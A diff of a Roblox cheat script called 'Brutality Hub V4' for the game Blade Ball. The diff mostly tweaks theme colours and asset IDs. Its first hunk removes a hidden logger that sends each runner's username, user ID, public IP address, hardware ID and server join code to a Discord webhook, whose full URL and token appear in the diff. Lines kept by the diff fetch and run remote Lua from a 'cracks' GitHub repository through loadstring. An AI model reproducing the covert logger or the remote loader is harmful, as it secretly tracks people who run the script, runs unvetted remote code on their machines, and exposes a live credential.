@@ -1,71 +1,3 @@
-function PostWebhook(Url, message)
-    local request = http_request or request or HttpPost or syn.request
-    local data =
-        request(
-        {
-            Url = Url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(message)
-        }
-    )
-    return ""
-end
-
-function AdminLoggerMsg()
-    AdminMessage = {
-        ["embeds"] = {
-            {
-                ["title"] = "**BRUTALITY HUB V4**",
-                ["description"] ="Blade Ball",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xea00ff), --kuning
-                ["fields"] = {
-                    {
-                        ["name"] = "**Username**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**UserID**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**PlaceID**",
-                        ["value"] = "```" .. game.PlaceId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Hwid**",
-                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**JobID**",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Join Code**",
-                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
-                        ["inline"] = false
-                    }
-                },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }
-        }
-    }
-    return AdminMessage
-end
-
-PostWebhook("https://discord.com/api/webhooks/1274745118645289030/GYRUZSBElW6_JdB-K6-PilR0S-RzptVmo8y0sGKSmpswid1ycAvsT0Ky0MYc4xE6qkxL", AdminLoggerMsg())
-
 local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Library/V5.lua"))()
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Library/V4.lua"))()
 if game.PlaceId == 13772394625 then
@@ -661,10 +593,10 @@ redzlib.Themes.DarkRed = {
         ColorSequenceKeypoint.new(0.50, Color3.fromRGB(30.5, 30.5, 30.5)),
         ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0.5))
     }),
-    ["Color Hub 2"] = Color3.fromRGB(28, 28, 28),
+    ["Color Hub 2"] = Color3.fromRGB(0, 0, 0),
     ["Color Stroke"] = Color3.fromRGB(38, 38, 38),
-    ["Color Theme"] = Color3.fromRGB(252, 219, 3),
-    ["Color Text"] = Color3.fromRGB(240, 240, 240),
+    ["Color Theme"] = Color3.fromRGB(255, 0, 0),
+    ["Color Text"] = Color3.fromRGB(255, 255, 255),
     ["Color Dark Text"] = Color3.fromRGB(180, 180, 180)
 }  
 
@@ -692,20 +624,20 @@ Tab1:AddDiscordInvite({
     Name = "Brutality Hub Official",
     Description = "join to get the latest information",
     Invite = "https://discord.gg/brutality-hub-1182005198206545941",
-    Logo = "rbxassetid://110958770625024"
+    Logo = "rbxassetid://107679910024355"
 })
 
 Tab1:AddDiscordInvite({
     Name = "Brutality Hub Youtube",
     Description = "Please subscribe for get notify update script",
     Invite = "www.youtube.com/@medusascriptroblox",
-    Logo = "rbxassetid://110958770625024"
+    Logo = "rbxassetid://107679910024355"
 })
 
 
 Window:AddMinimizeButton({
     Button = {
-        Image = "rbxassetid://104397992902189"
+        Image = "rbxassetid://107679910024355"
     },
     UICorner = {true,
     CornerRadius = UDim.new(0.5, 0)
